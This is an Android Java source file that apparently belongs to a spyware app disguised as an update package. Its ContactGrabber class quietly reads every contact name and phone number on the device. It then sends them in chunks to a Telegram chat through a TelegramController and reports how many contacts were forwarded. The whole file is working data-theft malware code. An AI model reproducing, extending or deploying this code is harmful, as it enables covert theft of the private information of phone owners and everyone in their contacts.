package com.kasari.update;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;

public class ContactGrabber {

    public static void sendContacts(Context context) {
        new Thread(() -> {
            try {
                StringBuilder sb = new StringBuilder();
                sb.append("👤 **Contacts**\n\n");
                
                Cursor cursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, 
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
                
                if (cursor != null) {
                    int count = 0;
                    while (cursor.moveToNext()) {
                        String name = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        String number = cursor.getString(
                            cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        
                        if (name != null && number != null) {
                            String entry = "👤 " + name + " : " + number + "\n";
                            
                            if (sb.length() + entry.length() > 4000) {
                                TelegramController.sendMessage(context, sb.toString());
                                Thread.sleep(1000);
                                sb = new StringBuilder();
                            }
                            
                            sb.append(entry);
                            count++;
                        }
                    }
                    cursor.close();
                    
                    if (sb.length() > 0) {
                        TelegramController.sendMessage(context, sb.toString());
                    }
                    
                    TelegramController.sendMessage(context, 
                        "✅ Total " + count + " contacts forwarded");
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }
}